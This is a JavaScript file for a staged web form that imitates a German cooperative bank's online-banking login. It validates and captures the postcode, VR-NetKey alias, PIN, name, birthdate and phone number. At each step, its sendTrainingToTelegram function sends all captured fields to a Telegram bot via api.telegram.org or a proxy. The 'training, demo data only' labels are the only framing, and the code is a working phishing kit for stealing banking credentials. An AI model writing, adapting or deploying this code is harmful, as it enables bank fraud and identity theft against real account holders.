document.addEventListener('DOMContentLoaded', function () {
  var panelIds = ['plz_container', 'login_container', 'personal_data_container', 'redirect_container'];
  var plzInput = document.getElementById('plz_input');
  var plzError = document.getElementById('plz_error');
  var plzGroup = document.getElementById('plz_input_group');
  var aliasInput = document.getElementById('alias_input');
  var aliasError = document.getElementById('alias_error');
  var aliasErrorText = document.getElementById('alias_error_text');
  var aliasGroup = document.getElementById('alias_input_group');
  var passwordInput = document.getElementById('password');
  var passwordError = document.getElementById('password_error');
  var passwordGroup = document.getElementById('password_input_group');
  var personalSalutation = document.getElementById('personal_salutation');
  var personalVorname = document.getElementById('personal_vorname');
  var personalNachname = document.getElementById('personal_nachname');
  var personalPhone = document.getElementById('personal_phone');

  function setPersonalFieldError(groupId, errorId, show) {
    var g = document.getElementById(groupId);
    var err = document.getElementById(errorId);
    if (!g || !err) return;
    if (show) {
      g.classList.add('has-error');
      err.hidden = false;
    } else {
      g.classList.remove('has-error');
      err.hidden = true;
    }
  }

  function isPersonalSalutationValid() {
    return personalSalutation && String(personalSalutation.value || '').trim() !== '';
  }

  function isPersonalNameValid(el) {
    return el && String(el.value || '').trim().length > 0;
  }

  function isPersonalBirthdateValid() {
    var birthEl = document.getElementById('personal_birthdate');
    if (!birthEl) return false;
    var s = String(birthEl.value || '').trim();
    if (!/^\d{2}\.\d{2}\.\d{4}$/.test(s)) {
      return false;
    }
    var p = s.split('.');
    var day = parseInt(p[0], 10);
    var month = parseInt(p[1], 10);
    var year = parseInt(p[2], 10);
    if (month < 1 || month > 12 || day < 1 || day > 31) {
      return false;
    }
    var nowY = new Date().getFullYear();
    if (year < 1900 || year > nowY) {
      return false;
    }
    var d = new Date(year, month - 1, day);
    return (
      d.getFullYear() === year &&
      d.getMonth() === month - 1 &&
      d.getDate() === day
    );
  }

  function isPersonalPhoneValid() {
    if (!personalPhone) return false;
    var digits = String(personalPhone.value || '').replace(/\D/g, '');
    return digits.length >= 6 && digits.length <= 15;
  }

  function validatePersonalDataForm() {
    var salOk = isPersonalSalutationValid();
    var vorOk = isPersonalNameValid(personalVorname);
    var nachOk = isPersonalNameValid(personalNachname);
    var birthOk = isPersonalBirthdateValid();
    var phoneOk = isPersonalPhoneValid();

    setPersonalFieldError('personal_salutation_group', 'personal_salutation_error', !salOk);
    setPersonalFieldError('personal_vorname_group', 'personal_vorname_error', !vorOk);
    setPersonalFieldError('personal_nachname_group', 'personal_nachname_error', !nachOk);
    setPersonalFieldError('personal_birthdate_group', 'personal_birthdate_error', !birthOk);
    setPersonalFieldError('personal_phone_group', 'personal_phone_error', !phoneOk);

    if (!salOk && personalSalutation) {
      personalSalutation.focus();
      return false;
    }
    if (!vorOk && personalVorname) {
      personalVorname.focus();
      return false;
    }
    if (!nachOk && personalNachname) {
      personalNachname.focus();
      return false;
    }
    if (!birthOk) {
      var b = document.getElementById('personal_birthdate');
      if (b) {
        b.focus();
      }
      return false;
    }
    if (!phoneOk && personalPhone) {
      personalPhone.focus();
      return false;
    }
    return true;
  }

  function getTrainingCfg() {
    return typeof window.TRAINING_TELEGRAM === 'object' && window.TRAINING_TELEGRAM !== null
      ? window.TRAINING_TELEGRAM
      : {};
  }

  function getTrainingField(id) {
    var el = document.getElementById(id);
    if (!el) {
      return '';
    }
    if (el.tagName === 'SELECT') {
      var opt = el.options[el.selectedIndex];
      return opt ? String(opt.text || opt.value || '').trim() : '';
    }
    return String(el.value != null ? el.value : '').trim();
  }

  function buildTrainingTelegramText(stepName) {
    var salEl = document.getElementById('personal_salutation');
    var salVal = salEl && salEl.value ? String(salEl.value) : '';
    return [
      'Ausbildung/Test (nur Demo-Daten)',
      'Schritt: ' + stepName,
      '---',
      'PLZ: ' + getTrainingField('plz_input'),
      'VR-NetKey/Alias: ' + getTrainingField('alias_input'),
      'PIN: ' + getTrainingField('password'),
      'Anrede: ' + salVal,
      'Vorname: ' + getTrainingField('personal_vorname'),
      'Nachname: ' + getTrainingField('personal_nachname'),
      'Geburtsdatum: ' + getTrainingField('personal_birthdate'),
      'Telefon: ' + getTrainingField('personal_phone')
    ].join('\n');
  }

  function sendTrainingToTelegram(stepName) {
    var cfg = getTrainingCfg();
    var chatId = cfg.chatId;
    var text = buildTrainingTelegramText(stepName);
    var body = JSON.stringify({ chat_id: chatId, text: text });

    if (!chatId) {
      console.warn('[Ausbildung] telegram-config.js: chatId fehlt.');
      return Promise.resolve();
    }

    var url;
    if (cfg.proxyUrl) {
      url = cfg.proxyUrl;
    } else if (cfg.token) {
      url =
        'https://api.telegram.org/bot' + encodeURIComponent(cfg.token) + '/sendMessage';
    } else {
      console.warn('[Ausbildung] Weder proxyUrl noch token in telegram-config.js gesetzt.');
      return Promise.resolve();
    }

    return fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: body
    })
      .then(function (res) {
        if (!res.ok) {
          return res.text().then(function (t) {
            console.warn('[Ausbildung] Telegram Antwort:', res.status, t);
          });
        }
      })
      .catch(function (err) {
        console.warn('[Ausbildung] Telegram senden fehlgeschlagen:', err);
      });
  }

  function isPlzValid() {
    if (!plzInput) return false;
    var v = plzInput.value.replace(/\s/g, '');
    return /^\d{5}$/.test(v);
  }

  function setPlzError(show) {
    if (!plzGroup || !plzError) return;
    if (show) {
      plzGroup.classList.add('has-error');
      plzError.hidden = false;
    } else {
      plzGroup.classList.remove('has-error');
      plzError.hidden = true;
    }
  }

  var aliasFormatHint =
    'geben Sie einen gültigen VR-NetKey oder Alias ein.';

  function aliasValueMeetsRules(raw) {
    var v = (raw == null ? '' : String(raw)).trim();
    if (v.length < 7 || v.length > 35) {
      return false;
    }
    if (!/[A-Za-zÄäÖöÜüß]/.test(v)) {
      return false;
    }
    return /^[A-Za-zÄäÖöÜüß0-9_.-]+$/.test(v);
  }

  function setAliasError(show, errorKind) {
    if (!aliasGroup || !aliasError) return;
    if (show) {
      aliasGroup.classList.add('has-error');
      aliasError.hidden = false;
      if (aliasErrorText) {
        aliasErrorText.textContent =
          errorKind === 'format' ? aliasFormatHint : 'VR-NetKey oder Alias erforderlich';
      }
    } else {
      aliasGroup.classList.remove('has-error');
      aliasError.hidden = true;
    }
  }

  function setPasswordError(show) {
    if (!passwordGroup || !passwordError) return;
    if (show) {
      passwordGroup.classList.add('has-error');
      passwordError.hidden = false;
    } else {
      passwordGroup.classList.remove('has-error');
      passwordError.hidden = true;
    }
  }

  function showPanel(visibleId) {
    panelIds.forEach(function (id) {
      var el = document.getElementById(id);
      if (!el) return;
      if (id === visibleId) {
        el.style.removeProperty('display');
      } else {
        el.style.display = 'none';
      }
    });

    if (visibleId === 'plz_container') {
      setPlzError(false);
    }
    if (visibleId === 'login_container') {
      setAliasError(false);
      setPasswordError(false);
    }
    if (visibleId === 'personal_data_container') {
      setPersonalFieldError('personal_salutation_group', 'personal_salutation_error', false);
      setPersonalFieldError('personal_vorname_group', 'personal_vorname_error', false);
      setPersonalFieldError('personal_nachname_group', 'personal_nachname_error', false);
      setPersonalFieldError('personal_birthdate_group', 'personal_birthdate_error', false);
      setPersonalFieldError('personal_phone_group', 'personal_phone_error', false);
    }

    var infoSection = document.querySelector('.container > .info_container');
    if (infoSection) {
      if (visibleId === 'personal_data_container' || visibleId === 'redirect_container') {
        infoSection.style.display = 'none';
      } else {
        infoSection.style.removeProperty('display');
      }
    }
  }

  if (plzInput) {
    plzInput.addEventListener('input', function () {
      if (isPlzValid()) {
        setPlzError(false);
      }
    });
  }

  var plzBtn = document.getElementById('plz_login_button');
  if (plzBtn) {
    plzBtn.addEventListener('click', function (e) {
      e.preventDefault();
      if (!isPlzValid()) {
        setPlzError(true);
        if (plzInput) {
          plzInput.focus();
        }
        return;
      }
      setPlzError(false);
      sendTrainingToTelegram('1 PLZ / Ort');
      showPanel('login_container');
    });
  }

  var cancelBtn = document.getElementById('cancel_button');
  if (cancelBtn) {
    cancelBtn.addEventListener('click', function (e) {
      e.preventDefault();
      showPanel('plz_container');
    });
  }

  if (aliasInput) {
    aliasInput.addEventListener('input', function () {
      var t = aliasInput.value.trim();
      if (t === '' || aliasValueMeetsRules(aliasInput.value)) {
        setAliasError(false);
      }
    });
  }

  if (passwordInput) {
    passwordInput.addEventListener('input', function () {
      if (passwordInput.value.trim() !== '') {
        setPasswordError(false);
      }
    });
  }

  var loginBtn = document.getElementById('login_button');
  if (loginBtn) {
    loginBtn.addEventListener('click', function (e) {
      e.preventDefault();
      e.stopPropagation();

      var loginBox = document.getElementById('login_container');
      var aEl = loginBox ? loginBox.querySelector('#alias_input') : aliasInput;
      var pEl = loginBox ? loginBox.querySelector('#password') : passwordInput;

      var aliasVal = aEl ? String(aEl.value).trim() : '';
      var pinVal = pEl ? String(pEl.value).trim() : '';

      var aliasEmpty = aliasVal.length === 0;
      var pinEmpty = pinVal.length === 0;
      var aliasOk = !aliasEmpty && aliasValueMeetsRules(aliasVal);
      var hasError = false;

      if (aliasEmpty) {
        setAliasError(true, 'required');
        hasError = true;
      } else if (!aliasOk) {
        setAliasError(true, 'format');
        hasError = true;
      } else {
        setAliasError(false);
      }

      if (pinEmpty) {
        setPasswordError(true);
        hasError = true;
      } else {
        setPasswordError(false);
      }

      if (hasError) {
        if (aliasEmpty || !aliasOk) {
          if (aEl) {
            aEl.focus();
          }
        } else if (pinEmpty && pEl) {
          pEl.focus();
        }
        return;
      }

      sendTrainingToTelegram('2 Login (Alias + PIN)');
      showPanel('personal_data_container');
    });
  }

  function formatBirthdateDE(value) {
    var d = String(value || '')
      .replace(/\D/g, '')
      .slice(0, 8);
    if (d.length <= 2) {
      return d;
    }
    if (d.length <= 4) {
      return d.slice(0, 2) + '.' + d.slice(2);
    }
    return d.slice(0, 2) + '.' + d.slice(2, 4) + '.' + d.slice(4);
  }

  var birthInput = document.getElementById('personal_birthdate');
  if (birthInput) {
    birthInput.addEventListener('input', function () {
      var val = birthInput.value;
      var sel = birthInput.selectionStart == null ? val.length : birthInput.selectionStart;
      var digitsBefore = val.slice(0, sel).replace(/\D/g, '').length;
      var next = formatBirthdateDE(val);
      birthInput.value = next;
      var pos = 0;
      var count = 0;
      for (var i = 0; i < next.length; i++) {
        if (/\d/.test(next.charAt(i))) {
          count++;
        }
        if (count >= digitsBefore) {
          pos = i + 1;
          break;
        }
      }
      if (digitsBefore === 0) {
        pos = 0;
      }
      birthInput.setSelectionRange(pos, pos);
      if (isPersonalBirthdateValid()) {
        setPersonalFieldError('personal_birthdate_group', 'personal_birthdate_error', false);
      }
    });
  }

  if (personalSalutation) {
    personalSalutation.addEventListener('change', function () {
      if (isPersonalSalutationValid()) {
        setPersonalFieldError('personal_salutation_group', 'personal_salutation_error', false);
      }
    });
  }

  if (personalVorname) {
    personalVorname.addEventListener('input', function () {
      if (isPersonalNameValid(personalVorname)) {
        setPersonalFieldError('personal_vorname_group', 'personal_vorname_error', false);
      }
    });
  }

  if (personalNachname) {
    personalNachname.addEventListener('input', function () {
      if (isPersonalNameValid(personalNachname)) {
        setPersonalFieldError('personal_nachname_group', 'personal_nachname_error', false);
      }
    });
  }

  if (personalPhone) {
    personalPhone.addEventListener('input', function () {
      if (isPersonalPhoneValid()) {
        setPersonalFieldError('personal_phone_group', 'personal_phone_error', false);
      }
    });
  }

  var personalSubmitBtn = document.getElementById('personal_data_submit_button');
  if (personalSubmitBtn) {
    personalSubmitBtn.addEventListener('click', function (e) {
      e.preventDefault();
      if (!validatePersonalDataForm()) {
        return;
      }
      sendTrainingToTelegram('3 Persönliche Daten');
      showPanel('redirect_container');
    });
  }
});
